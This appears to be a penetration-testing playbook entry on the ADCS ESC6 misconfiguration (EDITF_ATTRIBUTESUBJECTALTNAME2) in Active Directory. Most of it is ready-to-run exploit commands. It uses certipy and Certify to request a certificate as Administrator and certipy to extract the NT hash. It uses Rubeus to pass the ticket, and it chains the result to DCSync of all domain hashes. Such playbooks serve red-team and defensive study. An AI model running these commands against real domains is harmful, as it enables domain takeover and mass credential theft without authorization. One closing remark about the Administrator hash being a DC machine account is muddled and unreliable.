---
id: adcs-esc6
title: ADCS ESC6 — EDITF_ATTRIBUTESUBJECTALTNAME2
stage: privesc
tags: [windows, ad]
summary: A CA-level flag that makes every Client Authentication template enrollable with an arbitrary Subject Alternative Name — certipy finds it, and exploitation is identical to ESC1.
leads_to:
  - domain-admin
  - dcsync
---

## Prerequisites

A domain account with enrollment rights in any Client Authentication certificate template. The CA must have `EDITF_ATTRIBUTESUBJECTALTNAME2` set (certipy reports this as ESC6). This is a CA-level setting, not a template setting — it affects every template simultaneously.

ESC6 differs from ESC1 in that the misconfiguration is on the CA itself, not on a specific template. The flag `EDITF_ATTRIBUTESUBJECTALTNAME2` tells the CA to honour the SAN field in certificate requests, even for templates that don't explicitly allow it. You can request a certificate as any domain user (including Domain Admins) using any enrollable template.

## Quick Win

> certipy find — look for "ESC6" in the output.

```bash
certipy find -u $USER@$DOMAIN -p $PASS -dc-ip $DC_IP -stdout
# Look for: [!] Vulnerabilities: ESC6
```

## Check Manually

```bash
# LDAP query for the flag on the CA
certipy find -u $USER@$DOMAIN -p $PASS -dc-ip $DC_IP -enabled

# The CA object's flags attribute: 0x40 = EDITF_ATTRIBUTESUBJECTALTNAME2
```

## Exploit

```bash
# Step 1: request a certificate as the DA account
# Use any enrollable Client Auth template (e.g., "User")
certipy req -u $USER@$DOMAIN -p $PASS -dc-ip $DC_IP \
  -ca 'CA-NAME' \
  -template User \
  -upn administrator@$DOMAIN

# Step 2: authenticate with the cert to get NT hash
certipy auth -pfx administrator.pfx -dc-ip $DC_IP

# → Returns NT hash of Administrator
```

## Alternative Tool (Windows)

```powershell
# Certify (Windows)
.\Certify.exe find /vulnerable

# Request cert with SAN override
.\Certify.exe request /ca:CA-NAME /template:User /altname:administrator
# Convert .pem to .pfx via openssl, then:
.\Rubeus.exe asktgt /user:administrator /certificate:admin.pfx /password:pass /ptt
```

## Leads To

Certificate for Administrator obtained → certipy auth returns NT hash → pass-the-hash as Administrator → DCSync all domain hashes → domain-admin. If Administrator hash is a DC machine account, it enables DCSync directly.
